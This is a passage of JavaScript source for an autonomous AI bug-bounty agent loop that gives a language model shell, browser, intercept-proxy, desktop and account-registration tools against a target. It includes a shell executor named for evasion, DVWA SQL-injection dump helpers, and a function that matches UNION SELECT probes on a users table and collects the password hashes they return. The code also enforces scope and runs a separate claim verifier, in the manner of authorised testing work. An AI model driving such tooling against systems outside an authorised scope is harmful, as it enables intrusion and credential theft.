// Dark Matter — HUMAN MODE: one free hunter, not a pipeline.
//
// The staged pipeline (recon -> plan-of-3 -> injected deterministic
// probes -> special-command grammar) made the agent a form-filler: it
// could only do what a stage allowed, and the model almost never used
// the SEARCH:/WRITE_ARTIFACT: grammar bolted onto it (0 organic uses,
// audited 20 Oct 2026). The owner's model of the product is a HIRED
// HUMAN: give them a target and a machine, and they work — they look
// at the screen, think, click, search, write a script, run it, read
// the output, adapt — in one fluid loop, non-stop.
//
// humanIteration() is that loop, bounded to a number of turns per call
// (the hunt loop calls it repeatedly, forever, until stop/credits):
//
//   PERCEIVE  the "screen": memory briefing (full history + global
//             lessons) + findings so far + live machine state (pwd,
//             workspace listing) + the last action's full result.
//   THINK     one chatWithAI call. The model thinks briefly in prose,
//             then ends with EXACTLY ONE self-chosen action as JSON.
//   ACT       shell / search / write_file / note / browser_* /
//             proxy_start / intercept_* (Lane U) / screenshot /
//             claim_finding — executed through the SAME machinery
//             the pipeline uses (executeWithEvasion for shell,
//             webSearch, artifacts, guiTools, proxyIntercept).
//   OBSERVE   the result becomes the next turn's screen. Nothing is
//             hidden and nothing is staged.
//
// What deliberately STAYS (programme law + the 100% truth rule, not
// scaffolding): parsedScope enforcement (out-of-scope hosts blocked,
// heavy scanners blocked when the programme forbids them, the
// requests-per-minute cap paced between shell actions) and the
// pipeline verifier for claimed findings — a claim is re-run and
// judged by assessResult; the hunter can never verify its own claim.
// No deterministic probes are injected here, ever.
//
// Everything external is an injectable dep (opts.deps) so the loop is
// testable end-to-end with fakes — see scripts/test-human-loop.mjs.

import fs from 'node:fs';
import path from 'node:path';
import { execInHuntContainerWithRespawn } from './huntRunner.js';
import { guardClaimTitle } from './claimTitleGuard.js';
import { chatWithAI } from './llm.js';
import { isOneLoopEnabled, isOneLoopDryRun } from './brain/oneLoopBrain.js';
import { runOneLoopSession } from './brain/oneLoopSession.js';
import { webSearch } from './webSearch.js';
import { writeArtifact, spillOutput, artifactInfo, writeFileObservation } from './artifacts.js';
import { isMachineControlled, getControl } from './machineControl.js';
import { appendHuntEvent, readHuntMeta, writeHuntMetaCheckpoint, readHuntEvents, huntDir, ensureHuntDir } from './store.js';
import { normalisedActionDetail, actionSignature, contentHash } from './actionIdentity.js';
import { recallById, firstRunNumber, parseRecallId, formatFullRecord } from './actionIndex.js';
import { recordReasoning, getAllReasoning } from './reasoningMemory.js';
import { findWrongTargetPaths, knownAppOf, knownAppSOMLines } from './knownApps.js';
import { detectEvidence, isDuplicate } from './autoFiler.js';
import { dvwaLogin, dvwaSqliDump } from './dvwaAuth.js';
import { runLabLoginFirst } from './labLogin.js';
import { listSkills, loadSkill } from './skillCards.js';
import { saveCredential, getCredential, generatePassword, generatePersonaUsername, scrubSecrets, touchCredential, markVerified } from './credentials.js';
import { createDetailRequest, getPendingRequests, listDetailRequests, getFilledValues, detailValuesForScrub, detailsRequestScreenLines } from './userDetails.js';
import { createInboxPreferred, pollForCode } from './tempmail.js';
import { loadCoverage, saveCoverage, applyRecord, recordCoverage, updateCoverage, mergeResearchDebt, probedClassIds, normaliseCoverageClass } from './coverageLedger.js';
import {
  guiBrowserOpen,
  guiBrowserSnapshot,
  guiBrowserClick,
  guiBrowserType,
  guiBrowserScreenshot,
} from './guiTools.js';
// Infinity level (26 Oct 2026): the parsed page-state record —
// every snapshot becomes state (URL, page type, interactive
// elements with tried/untried marks) instead of a 300-char stub
// in the record, and the loop counters that measure the sense-act
// loop. Pure; the loop owns the wiring.
import { emptyPageState, loadPageState, savePageState, mergePageState, markElementClicked, markTypedInto, pageStateLines, loopCounters, loopCounterLines, coverageSummaryLines } from './pageState.js';
// MISSION Stage 2 (31 Oct 2026): explicit action verification — the brain
// may declare what it expects (action.expect); the verdict is appended to
// the turn's observation so success is proven, never assumed.
import { verifyExpectation } from './actionVerify.js';
// MISSION Stage 3 (31 Oct 2026): structured action plans — objective,
// state, expected, risk, fallback; fallback surfaces on verify-fail.
import { parsePlan, fallbackLine } from './actionPlan.js';
// WHOLE-OS CONTROL (26 Oct 2026): the desktop channel — xdotool on
// the same X :99 the Take Control x11vnc serves (see desktopControl.js
// for why xdotool, not a from-scratch RFB client).
import {
  DESKTOP_WINDOWS_CMD,
  parseDesktopWindows,
  emptyDesktopState,
  mergeDesktopState,
  markWindowInteracted,
  desktopStateLines,
  resolveWindowForClick,
  desktopClickCommand,
  parseDesktopKeys,
  desktopKeyCommand,
  desktopTypeCommand,
  shellQuote,
  captureDesktopScreenshot,
  // HUMAN-BRAIN (26 Oct 2026): GUI-visible terminal builders.
  DESKTOP_TERMINAL_LAUNCH_CMD,
  DESKTOP_TERMINAL_WINDOWS_CMD,
  DESKTOP_TERMINAL_COMMAND_CAP,
  desktopTerminalLogFile,
  desktopTerminalWrapCommand,
  parseTerminalExit,
} from './desktopControl.js';
// SCREEN-SEEING (27 Oct 2026, owner order): the text-only brain reads the
// desktop through a TEXT MAP (screenshot -> OCR words + coordinates) and
// clicks at map coordinates — see_screen + desktop_click_at.
import {
  captureScreenMap,
  parseClickAt,
  desktopClickAtCommand,
  screenMapErrorLine,
  parseScreenMapLines,
} from './screenMap.js';
// VISIBLE-DESKTOP-FIRST (27 Oct 2026, owner order): the brain must
// hunt THROUGH the visible desktop so the owner SEES it work —
// interactive steps on the desktop, shell only for work that needs
// no screen. Pure routing helpers (prompt section, turn classifier,
// shell-login detector, next-turn nudge, per-turn heartbeat).
import { looksLikeShellLogin, desktopFirstNudge, heartbeatBlock } from './desktopFirst.js';
// REAL-HUMAN (26 Oct 2026): the owner's queued questions (the
// brain answers them in-turn — see chatQueue.js) and in-app
// clicking via the AT-SPI accessibility tree (desktopAtspi.js).
// The chat-answer delivery appends to the chat-messages file
// (routes/chats.js) — humanLoop owns the loop side, chats.js owns
// the file, and neither imports the other's route layer.
import { pendingChatQuestions, chatQuestionScreenLines, extractChatAnswers } from './chatQueue.js';
import { clickControlCommand, parseAtspiOutput, atspiFailureObservation, atspiSuccessObservation } from './desktopAtspi.js';
// TOOLS/OS AUTONOMY (27 Oct 2026, owner order): named tool launches,
// allow-listed installs, AT-SPI control lists, and the Burp first-use
// path — the structured actions the skill card only described.
import { resolveTool, launchGuiTool, checkCliTool, downloadTool, listToolControls, burpFirstUse, burpFirstUseDone, recordToolState, TOOL_IDS } from './toolLaunch.js';
// HUNTER-MIND (26 Oct 2026): the brain's own hunt plan (huntPlan.js)
// and the output ledger (outputMemory.js). The plan is the brain's
// own instructions and the ledger is its saved outputs — the loop
// only persists them, renders them on the screen, and answers
// repeats from them. Neither module chooses an action.
import {
  emptyHuntPlan,
  loadHuntPlan,
  saveHuntPlan,
  setPlanSteps,
  markPlanStep,
  nextPlanStep,
  planStuck,
  huntPlanLines,
} from './huntPlan.js';
import {
  emptyOutputs,
  loadOutputs,
  saveOutputs,
  recordOutput,
  findOutput,
  outputCount,
  recallObservation,
} from './outputMemory.js';
// Lane U: the Burp-style intercept workflow (mitmproxy inside the
// hunt container; see proxyIntercept.js for the topology). The pure
// replay builders + signature are imported directly — deterministic
// code, exercised through the dispatch with a fake capture read.
import {
  startInterceptProxy,
  listIntercept,
  readInterceptEntry,
  buildReplayRequest,
  buildReplayCurl,
  replaySignature,
} from './proxyIntercept.js';
// Lane O: huntMemory.js is the single read path for the hunt's
// permanent record (reasoning, events, findings, coverage, the
// ruled-out registry, dossier, left-off, prior hunts of the same
// target). The pure record helpers that used to live in this file
// (applyRetractions, retractedFindingCount, extractDossierBriefing,
// deadEndLines) moved there and are re-exported below, so existing
// imports keep working unchanged.
import { loadHuntMemory, buildStateOfMind, applyRetractions, retractedFindingCount, extractDossierBriefing, deadEndLines, SOM_TOTAL_BUDGET } from './huntMemory.js';
import { COMMAND_CAP, OBS_BUDGET, clipResult, commandScopeViolation, heavyScanViolation, isReturnToTarget, lastActionResultOfLeftOff, pageUrlFromObservation, parseHumanAction, scopeViolation, targetHostsFor } from './humanLoop/scope.js';
import { buildMemoryBriefing, clipLine, coverageObservation, discoveredEndpoints, findingsFromEvents, mergeLeadsWithCoverage, reconcileSessionResearch, researchedNotProbedLines, researchedTopicStats, systemPromptFor, unprobedLeadLines } from './humanLoop/research.js';
import { claimClassFromTitle, claimGateCheck, classifyPayloadClass, probeProvesClaim, proofEndpointOfCommand, proofFileObservation, proofGateHit, proofSignatureFor } from './humanLoop/claims.js';
import { GATED_TOOLS, GUI_CONTROL_KINDS, authGateHit, buildActionHistory, dedupeGateHit, exploredDigestLines, hasSelfAuthAttempt, repetitionLines, searchRepeatHit } from './humanLoop/gates.js';
import { credentialStateFor, exhaustedBlockObservation, exhaustedSurfaceHit, exhaustedSurfaceLines, surfaceBlockCounts } from './humanLoop/exhausted.js';
import { failedSkillAsks, settledActionLines, settledBlockEvidence, skillNameKey } from './humanLoop/settled.js';
import { buildScreen, failedActionThreadLines, huntFactLines, leftOffLines, pendingPlannedProbeLines, pendingPlannedProbes, sessionJournalLines, skillCardLines, topicForSkillName } from './humanLoop/screen.js';
import { defaultDeliverChatAnswer, defaultRecallMemory, detailForAction } from './humanLoop/delivery.js';
export { defaultDeliverChatAnswer } from './humanLoop/delivery.js';
export { failedActionThreadLines, huntFactLines, leftOffLines, pendingPlannedProbeLines, pendingPlannedProbes, sessionJournalLines, skillCardLines } from './humanLoop/screen.js';
export { failedSkillAsks, settledActionLines, settledBlockEvidence } from './humanLoop/settled.js';
export { EXHAUSTED_MIN_BLOCKS, credentialStateFor, exhaustedBlockObservation, exhaustedSurfaceHit, exhaustedSurfaceLines, surfaceBlockCounts } from './humanLoop/exhausted.js';
export { FRESH_DEDUP_KINDS, GATED_TOOLS, GUI_CONTROL_KINDS, SEARCH_REPEAT_JACCARD, authGateHit, buildActionHistory, dedupeGateHit, exploredDigestLines, freshAttemptSinceAction, freshAttemptSinceType, hasSelfAuthAttempt, isProbeDetail, repetitionLines, searchQueryTokens, searchRepeatHit, searchTokenSimilarity } from './humanLoop/gates.js';
export { CLAIM_COMMAND_MIN, CLAIM_COUNTER_MIN, CLAIM_EVIDENCE_MIN, PROOF_THRESHOLD, claimClassFromTitle, claimGateCheck, classifyPayloadClass, probeProvesClaim, proofEndpointOfCommand, proofFileObservation, proofGateHit, proofSignatureFor, surfacePageOfUrl } from './humanLoop/claims.js';
export { PROBE_TOPICS, assembleMemoryBriefing, buildMemoryBriefing, discoveredEndpoints, globalLessonLines, memoryHeadLength, mergeLeadsWithCoverage, probeSignatureHits, reconcileSessionResearch, researchedNotProbedLines, researchedTopicStats, unprobedLeadLines } from './humanLoop/research.js';
export { clipResult, extractTaskBlock, isOnTargetHosts, isReturnToTarget, lastActionResultOfLeftOff, pageUrlFromObservation, parseHumanAction, scopeViolation, targetHostsFor } from './humanLoop/scope.js';

export { applyRetractions, retractedFindingCount, extractDossierBriefing, deadEndLines };

/**
 * Recover a previously observed SQLi proof when the model is trapped
 * repeatedly recalling it. Only historical tool output paired with a
 * recorded UNION/SQLi probe is eligible; model narration alone is not proof.
 */
export function recoverRecallLoopSqli(events, { consecutiveRecalls = 3 } = {}) {
  const rows = Array.isArray(events) ? events : [];
  let recalls = 0;
  for (let i = rows.length - 1; i >= 0; i--) {
    const e = rows[i];
    if (!e || e.type !== 'tool_call') continue;
    if (String(e.tool || '').toLowerCase() !== 'recall') break;
    recalls++;
  }
  if (recalls < consecutiveRecalls) return null;

  const textOf = (e) => [e.text, e.detail, e.output, e.result, e.observation, e.stdout, e.stderr, e.response]
    .filter((v) => typeof v === 'string').join('\n');
  const hashes = new Set();
  let evidenceText = '';
  let proofCommand = '';
  let afterSqliProbe = false;
  for (let i = Math.max(0, rows.length - 300); i < rows.length; i++) {
    const e = rows[i];
    if (!e) continue;
    if (e.type === 'tool_call') {
      const tool = String(e.tool || '').toLowerCase();
      if (tool === 'shell') {
        const detail = String(e.detail || '');
        afterSqliProbe = /\bunion\s+(?:all\s+)?select\b|\bselect\s+.+\s+from\s+users\b/i.test(detail);
        if (afterSqliProbe && !proofCommand) proofCommand = detail;
      } else if (tool !== 'recall') {
        afterSqliProbe = false;
      }
    }
    const text = textOf(e);
    const found = afterSqliProbe ? (text.match(/\b[a-f0-9]{32}\b/gi) || []) : [];
    if (found.length) {
      for (const h of found) hashes.add(h.toLowerCase());
      evidenceText += (evidenceText ? '\n' : '') + text.slice(0, 1800);
    }
  }
  if (hashes.size < 2 || !proofCommand) return null;
  return {
    recalls,
    hashes: [...hashes].slice(0, 12),
    command: proofCommand.slice(0, 4000),
    evidence: ('Recorded output after the SQLi UNION SELECT probe:\n' + evidenceText).slice(0, 3000),
  };
}

// applyRetractions / retractedFindingCount live in huntMemory.js
// since Lane O (imported + re-exported above).

// extractDossierBriefing lives in huntMemory.js since Lane O
// (imported + re-exported above); the dossier itself is loaded by
// loadHuntMemory, so the briefing below reads it from the snapshot.

/**
 * Canonical action identity lives in actionIdentity.js (moved there
 * verbatim in the keyword-index lane, 27 Oct 2026, so the gate and
 * the Action Index share one definition of "the same action").
 * Re-exported here so the import surface is unchanged.
 */
export { normalisedActionDetail, actionSignature } from './actionIdentity.js';

/**
 * Run one human-mode session: up to `turns` perceive->think->act->observe
 * cycles. Returns { aiOk, failKind?, turnsRun, actionsRun, newFindings, log }.
 *
 * opts:
 *   turns     — max turns this call (default 6)
 *   findings  — the hunt loop's findings array; verified records are pushed
 *   deps      — injectable machinery (tests): chat, exec (shell, pipeline
 *               semantics), execRaw (container exec), search, writeFile,
 *               spill, record, readMeta, writeMeta, readEvents, recordNote,
 *               pocExists (Lane N claim-gate artefact check), assess
 *               (pipeline verifier; explicit null disables the lazy
 *               default and claims are recorded UNVERIFIED), gui,
 *               intercept (Lane U proxy workflow), sleep, now,
 *               buildBriefing
 */
export async function humanIteration(huntId, target, opts = {}) {
  // RULE #42 (30 Oct 2026) — BRAIN_PROVIDER wiring: when
  // BRAIN_PROVIDER=oneloop the deterministic one-loop brain drives the
  // whole session instead of the LLM think step. Env-gated: unset (or
  // anything else) keeps the current path byte-identical below.
  // RULE #44 — BRAIN_PROVIDER=oneloop-dryrun audits the same flip path
  // with zero commits: the brain drives the turns, but the claim bridge
  // is disabled and no findings/leads are pushed (per-turn audit in the
  // loop's memdir, audit.jsonl). Spreading opts avoids mutating the
  // caller's object.
  if (isOneLoopEnabled()) {
    // RULE #43 — wire the backend claim bridge: newly FILED loop claims
    // go through the real claim pipeline (claimGateCheck + assessResult).
    // Lazy imports mirror the existing deps.assess pattern below; any
    // failure leaves the dep null and the bridge stays disabled (claims
    // surface as leads, Rule #42) — the gate itself never throws.
    let assessFn = null;
    let copyToContainerFn = null;
    try {
      ({ assessResult: assessFn } = await import('./huntAgent.js'));
    } catch { assessFn = null; }
    try {
      ({ copyFileToHuntContainer: copyToContainerFn } = await import('./huntRunner.js'));
    } catch { copyToContainerFn = null; }
    return runOneLoopSession({
      huntId, target,
      opts: { ...opts, dryRun: isOneLoopDryRun() },
      deps: {
        assessFn: assessFn || null,
        claimGateCheckFn: claimGateCheck,
        copyToContainerFn: copyToContainerFn || null,
      },
    });
  }
  const d = opts.deps || {};
  const deps = {
    chat: d.chat || chatWithAI,
    exec: d.exec || null, // lazy: pipeline executeWithEvasion
    // Lane E: the raw exec self-heals a missing hunt container (respawn
    // + one retry, target closed over from this iteration) — before this
    // the default called execInHuntContainer directly and a removed
    // container never came back for the whole hunt.
    execRaw: d.execRaw || ((h, c, t, o) => execInHuntContainerWithRespawn(h, c, t, { ...(o || {}), target })),
    search: d.search || webSearch,
    writeFile: d.writeFile || writeArtifact,
    spill: d.spill || spillOutput,
    record: d.record || appendHuntEvent,
    readMeta: d.readMeta || readHuntMeta,
    // FIX (21 Oct 2026, lane B): the session-end checkpoint goes through
    // the guarded checkpoint writer — a pause/stop the owner set during
    // the session must survive it (see store.writeHuntMetaCheckpoint).
    writeMeta: d.writeMeta || writeHuntMetaCheckpoint,
    readEvents: d.readEvents || readHuntEvents,
    recordNote: d.recordNote || recordReasoning,
    // Lane N: the claim gate's artefact check — a "poc" handle counts
    // only if the named file really exists in this hunt's artifacts.
    pocExists: d.pocExists || ((h, name) => Boolean(artifactInfo(h, name))),
    assess: 'assess' in d ? d.assess : (opts.assess || undefined), // undefined -> lazy pipeline assessResult; null -> disabled
    gui: d.gui || null, // lazy: guiTools bound to execRaw
    // Take Control of This Machine: while the owner holds the control
    // lock, the agent's GUI/browser actions are skipped (see the
    // control gate in the ACT section). Tests inject a stub here.
    machineControlled: d.machineControlled || ((h) => isMachineControlled(h)),
    intercept: d.intercept || null, // lazy: proxyIntercept bound to execRaw (Lane U)
    // WHOLE-OS CONTROL: the desktop screenshot (lazy: the owner's
    // scrot poller route + artifact save). Tests inject a stub here.
    desktopScreenshot: d.desktopScreenshot || null,
    // HUMAN-BRAIN (26 Oct 2026): starting the desktop for a
    // desktop_terminal action from a cold desktop (lazy: huntRunner
    // startHuntDesktop). Tests inject a stub here.
    startDesktop: d.startDesktop || null,
    // REAL-HUMAN (26 Oct 2026): delivering the brain's answer to a
    // queued owner question. The default records a chat_answer
    // event (which flows through the WS stream to the open hunt
    // view), appends the answer to the asking chat's message file,
    // and marks the question answered in the queue — the three
    // legs of the promise the queue makes. Tests inject a stub.
    deliverChatAnswer: d.deliverChatAnswer || defaultDeliverChatAnswer,
    sleep: d.sleep || ((ms) => new Promise((r) => setTimeout(r, ms))),
    now: d.now || (() => Date.now()),
    buildBriefing: d.buildBriefing || buildMemoryBriefing,
    recall: d.recall || defaultRecallMemory,
    // Lane AI: temp-mail seam (tests inject fakes; production uses
    // the real providers). Credentials module functions are used
    // directly — they honour config.dataDir (DATA_DIR in tests).
    createInbox: d.createInbox || createInboxPreferred,
    pollCode: d.pollCode || pollForCode,
  };
  // Lane O: the state-of-mind computer. Production path loads the
  // hunt's complete memory through huntMemory (the single read
  // path) and joins it with this file's own derivations (topic
  // accounting, endpoint discovery) over the same record. Tests may
  // inject deps.buildStateOfMind.
  const computeStateOfMind = (meta) => {
    if (typeof d.buildStateOfMind === 'function') return d.buildStateOfMind(huntId, target, meta);
    const memory = loadHuntMemory(huntId, { target, meta });
    const som = buildStateOfMind(memory, {
      topicStats: researchedTopicStats({ events: memory.events, reasoningRows: memory.reasoningRows }),
      endpoints: discoveredEndpoints(memory.events, target),
    });
    // INFINITY LEVEL: pending plans + the coverage summary ride
    // inside the SOM block — the two additions the brief names —
    // computed from the same memory the SOM was built from, so the
    // block never contradicts the record it summarises. Capped to
    // the remaining Lane Q budget, so the block never exceeds
    // SOM_TOTAL_BUDGET: a long SOM can cut these lines, but the
    // per-turn screen carries the same facts in its own never-
    // trimmed blocks (exhausted + page state), so nothing is lost.
    const extra = [];
    // KNOWN APP (zero-genuine lane): the fingerprint + the lab auth
    // state ride the SOM, so the brain never re-derives the app from
    // leaked endpoints — on DVWA the lines name the login-first
    // state and the wrong-app boundary every turn.
    try {
      const appLines = knownAppSOMLines({ knownApp: knownAppOf(meta, target), auth: (meta && meta.auth) || null });
      if (appLines.length) extra.push('', ...appLines);
    } catch { /* known-app lines are best-effort */ }
    try {
      const pending = pendingPlannedProbeLines({ events: memory.events, reasoningRows: memory.reasoningRows });
      if (pending.length) extra.push('', ...pending);
    } catch { /* pending plans are best-effort */ }
    try {
      const summary = coverageSummaryLines({
        events: memory.events,
        pageState: sessionPageState,
        target,
        credential: credentialStateFor({ events: memory.events, target }),
        counters: loopCounters({ events: memory.events, reasoningRows: memory.reasoningRows, pageState: sessionPageState }),
      });
      if (summary.length) extra.push('', ...summary);
    } catch { /* coverage summary is best-effort */ }
    if (extra.length) {
      let budgetLeft = SOM_TOTAL_BUDGET - som.join('\n').length;
      for (const line of extra) {
        if (line.length + 1 > budgetLeft) break;
        som.push(line);
        budgetLeft -= line.length + 1;
      }
    }
    return som;
  };
  const turns = Math.max(1, opts.turns || 6);
  const log = [];
  const newFindings = [];

  const meta0 = deps.readMeta(huntId) || {};
  // Lane P: this session's turns-total baseline. Per-turn progress
  // checkpoints (below) write ABSOLUTE totals computed from this
  // base, and the session-end checkpoint takes the max of what it
  // re-reads and base + turnsRun — so the two writers can never
  // double-count a turn.
  const sessionBaseTurns = (meta0.humanLoop && meta0.humanLoop.turnsTotal) || 0;
  // PROOF-COMPLETE (gate-replay lane, 28 Oct 2026): per-claim
  // re-proof counts, persisted in meta.proofCounts (plain object
  // sig -> count) so they survive sessions; the loop owns the live
  // Map and persists it on every proof (best-effort — a failed
  // persist never costs a turn). The per-turn progress checkpoint
  // re-reads meta fresh, so the two writers never clobber each
  // other.
  const proofCounts = new Map(
    Object.entries((meta0.proofCounts && typeof meta0.proofCounts === 'object') ? meta0.proofCounts : {})
      .map(([k, v]) => [String(k), Number(v) || 0])
      .filter(([, v]) => v > 0),
  );
  const persistProofCounts = () => {
    try { deps.writeMeta(huntId, { proofCounts: Object.fromEntries(proofCounts) }); } catch { /* best-effort */ }
  };
  const parsedScope = opts.parsedScope || meta0.parsedScope || null;
  const maxRpm = parsedScope && parsedScope.rules ? Number(parsedScope.rules.maxRequestsPerMin) || 0 : 0;
  const minShellGapMs = maxRpm > 0 ? Math.ceil(60000 / maxRpm) : 0;

  // Lane AI: session secrets. A password the brain invents or is
  // shown (a generated credential, a verification code) is added
  // here the moment it exists, and EVERY recorded surface is
  // scrubbed against the set before writing — the thinking event,
  // the tool_call detail, the reasoning note, the session log.
  // The in-memory screen (lastObservation) is deliberately NOT
  // scrubbed: that is exactly how a one-turn secret reaches the
  // brain for its next action, and the screen is never written
  // to disk. The vault file is the only place secrets persist.
  const sessionSecrets = new Set();
  // DYNAMIC DETAILS (27 Oct 2026): values the owner already gave for
  // this hunt join the secret set up front, so any quoting or typing
  // of them is scrubbed from the record from the first turn on.
  try { for (const v of detailValuesForScrub(huntId)) sessionSecrets.add(v); } catch { /* a broken details store never breaks the turn */ }
  const scrub = (s) => scrubSecrets(String(s ?? ''), sessionSecrets);
  const scrubEntry = (entry) => {
    if (!entry || typeof entry !== 'object') return entry;
    const out = {};
    for (const [k, v] of Object.entries(entry)) out[k] = typeof v === 'string' ? scrub(v) : v;
    return out;
  };

  const say = (text) => {
    try { deps.record(huntId, { type: 'thinking', text: scrub(text), via: 'human-mode' }); } catch { /* recording is best-effort */ }
  };
  const toolCall = (tool, detail) => {
    try { deps.record(huntId, { type: 'tool_call', tool, detail: scrub(String(detail || '')).slice(0, 300), via: 'human-mode' }); } catch { /* best-effort */ }
    // VISIBLE-DESKTOP-FIRST: record the executed action kind for
    // this turn's routing classification (desktop vs shell-only)
    // and flag a shell login attempt — a curl login leaves the
    // visible browser logged out, so the next screen must say so.
    try {
      const k = String(tool || '').toLowerCase();
      turnKinds.push(k);
      if (k === 'shell' && looksLikeShellLogin(detail)) turnShellLogin = true;
    } catch { /* routing bookkeeping is best-effort */ }
    // Lane F: every executed action joins the already-done history
    // the moment it is dispatched, so the gate sees this session's
    // own actions too — not just past sessions' records.
    try {
      const t = String(tool || '').toLowerCase();
      if (GATED_TOOLS.has(t) && String(detail || '').trim()) {
        const sig = actionSignature(t, detail);
        // Lane AF: the execution counts as FULL for now — the
        // post-execution bookkeeping (below, where lastResult is
        // attached) reclassifies it if the GUI result carried the
        // degraded flag. pendingPrevStreak remembers the streak
        // this execution is about to reset, so the reclassification
        // can restore-and-increment it, exactly as
        // buildActionHistory replays the recorded pair.
        let cur = actionHistory.get(sig);
        if (!cur) {
          cur = { tool: t, detail: normalisedActionDetail(t, detail), count: 0, fullCount: 0, degradedStreak: 0, lastResult: '' };
          actionHistory.set(sig, cur);
        }
        cur.count++;
        cur.fullCount++;
        pendingPrevStreak = cur.degradedStreak;
        cur.degradedStreak = 0;
        pendingSig = sig;
      }
    } catch { /* gate bookkeeping is best-effort */ }
  };
  const note = (entry) => {
    try { deps.recordNote(huntId, scrubEntry(entry)); } catch { /* best-effort */ }
  };

  // WRONG-PAGE GUARD (seam): the driver needs the hunt's target
  // hosts to pick the right tab. The loop already owns the target +
  // parsedScope, so it computes the host list once per session and
  // binds it into every gui call via the same deps channel the exec
  // already rides. guiTools itself stays target-agnostic except for
  // the optional deps.targetHosts / deps.targetUrl.
  const guiTarget = { targetHosts: targetHostsFor(target, parsedScope), targetUrl: target };
  const getGui = () => {
    if (!deps.gui) {
      const ex = (h, c, t, o) => deps.execRaw(h, c, t, o);
      deps.gui = {
        open: (h, url) => guiBrowserOpen(h, url, { exec: ex, ...guiTarget }),
        snapshot: (h) => guiBrowserSnapshot(h, { exec: ex, ...guiTarget }),
        click: (h, text) => guiBrowserClick(h, text, { exec: ex, ...guiTarget }),
        type: (h, target, text, submit) => guiBrowserType(h, target, text, submit, { exec: ex, ...guiTarget }),
        screenshot: (h) => guiBrowserScreenshot(h, { exec: ex, ...guiTarget }),
      };
    }
    return deps.gui;
  };

  // Lane U: the intercept workflow, bound to the same self-healing
  // raw exec as the GUI tools. Tests inject deps.intercept whole.
  const getIntercept = () => {
    if (!deps.intercept) {
      const ex = (h, c, t, o) => deps.execRaw(h, c, t, o);
      deps.intercept = {
        start: (h) => startInterceptProxy(h, { exec: ex }),
        list: (h) => listIntercept(h, { exec: ex }),
        read: (h, index) => readInterceptEntry(h, index, { exec: ex }),
      };
    }
    return deps.intercept;
  };

  // WHOLE-OS CONTROL: the desktop screenshot, bound lazily like the
  // GUI tools. Tests inject deps.desktopScreenshot whole; the
  // default reuses the owner's scrot poller route (huntRunner) and
  // saves the frame as a hunt artifact.
  const getDesktopScreenshot = () => {
    if (!deps.desktopScreenshot) deps.desktopScreenshot = (h) => captureDesktopScreenshot(h);
    return deps.desktopScreenshot;
  };

  // HUMAN-BRAIN: starting the desktop, bound lazily the same way.
  // Tests inject deps.startDesktop whole; the default is
  // huntRunner.startHuntDesktop (runs hunt-desktop.sh in the
  // container, reviving Chromium too).
  const getStartDesktop = () => {
    if (!deps.startDesktop) {
      deps.startDesktop = async (h) => {
        const hr = await import('./huntRunner.js');
        return hr.startHuntDesktop(h);
      };
    }
    return deps.startDesktop;
  };

  const getExec = async () => {
    if (!deps.exec) {
      const ha = await import('./huntAgent.js');
      deps.exec = ha.executeWithEvasion;
    }
    return deps.exec;
  };
  const getAssess = async () => {
    if (deps.assess === undefined) {
      try {
        const ha = await import('./huntAgent.js');
        deps.assess = ha.assessResult || null;
      } catch {
        deps.assess = null;
      }
    }
    return deps.assess;
  };

  let briefing = '';
  try {
    briefing = await deps.buildBriefing(huntId, target, meta0);
  } catch { /* briefing is best-effort */ }

  const system = systemPromptFor(target, parsedScope);
  // Perception facts computed once per session from the hunt's own
  // records (Lane D): the programme surface the gate will actually
  // allow, hunt-state facts (credentials), and exact-repeat counts.
  const scopeHosts = parsedScope && Array.isArray(parsedScope.inScope) ? parsedScope.inScope : [];
  const facts = huntFactLines(meta0);
  // Lane M: the skill-card index is static (our own playbook files),
  // so it is computed once per session and rides every screen.
  const skillLines = skillCardLines();
  // The hunt's recorded events, read once: they feed both the
  // Repetition Check (display) and the already-done gate (Lane F,
  // enforcement). The gate's history then stays live in-session via
  // toolCall above.
  let sessionEvents = [];
  try {
    sessionEvents = deps.readEvents(huntId) || [];
  } catch { /* events are best-effort */ }
  // Lane L: the reasoning-row count at session start — the session-
  // end reconciliation (P4) diffs only THIS session's slice of the
  // record, so it needs to know where the session began.
  let sessionRowCount = 0;
  try {
    sessionRowCount = (getAllReasoning(huntId) || []).length;
  } catch { /* reasoning read is best-effort */ }
  let repetition = [];
  try {
    repetition = repetitionLines(sessionEvents);
  } catch { /* repetition is best-effort */ }
  const actionHistory = buildActionHistory(sessionEvents);
  // Lane AD: skill names that already failed in this hunt, seeded
  // from the permanent reasoning record — a verbatim repeat of one
  // is answered from the record in the load_skill dispatch below
  // instead of re-running the lookup. The loop also learns new
  // failures as they happen, so the memory covers this session too.
  let failedSkills = new Map();
  try {
    failedSkills = failedSkillAsks(getAllReasoning(huntId) || []);
  } catch { /* failed-skill memory is best-effort */ }
  let pendingSig = null; // signature of the action executing this turn
  let pendingDegraded = false; // Lane AF: the executing browser action's result was the look-only fallback
  let pendingPrevStreak = 0; // Lane AF: the signature's degraded streak before this execution
  let lastObservation = '';
  // WRONG-PAGE GUARD: the page the live browser is currently on,
  // as last observed ('' = unknown). Only EXECUTED browser
  // observations set it — never gate-block text, which names the
  // page the agent TRIED to reach, not the one it is on.
  let currentPageUrl = '';
  // WRONG-PAGE GUARD: track the live tab from an executed browser
  // observation. Seeding from the turn-start snapshot or a browser
  // action is the only way this moves.
  const notePageUrl = (obs) => {
    const u = pageUrlFromObservation(obs);
    if (u) currentPageUrl = u;
  };
  // INFINITY LEVEL: the parsed page state for this session —
  // loaded from pageState.json (coverage-ledger idiom), merged
  // from every executed snapshot, saved per turn. The brain's next
  // action is chosen against this record, never against a 300-char
  // stub. Declared before the loop so computeStateOfMind (defined
  // above) can read it at call time; its first call is in the loop.
  let sessionPageState = emptyPageState();
  try { sessionPageState = loadPageState(huntId); } catch { /* a bad file starts fresh */ }
  // HUNTER-MIND: the brain's own plan + its saved outputs — loaded
  // once per session (the files are the record; the loop only renders
  // them and writes back what the brain changes).
  let sessionPlan = emptyHuntPlan(target);
  try { sessionPlan = loadHuntPlan(huntId); } catch { /* a bad plan file starts fresh */ }
  let sessionOutputs = emptyOutputs();
  try { sessionOutputs = loadOutputs(huntId); } catch { /* a bad ledger file starts fresh */ }
  // WHOLE-OS CONTROL: the desktop state for this session —
  // in-memory only. The window list is re-read live on every
  // desktop_snapshot (small, re-derivable); what persists is the
  // interaction history in the tool_call record, counted by
  // loopCounters. The interacted titles survive across snapshots
  // within the session via mergeDesktopState.
  let sessionDesktopState = emptyDesktopState();
  // VISIBLE-DESKTOP-FIRST: per-turn routing state. turnKinds
  // records the action kinds THIS turn executed (toolCall appends);
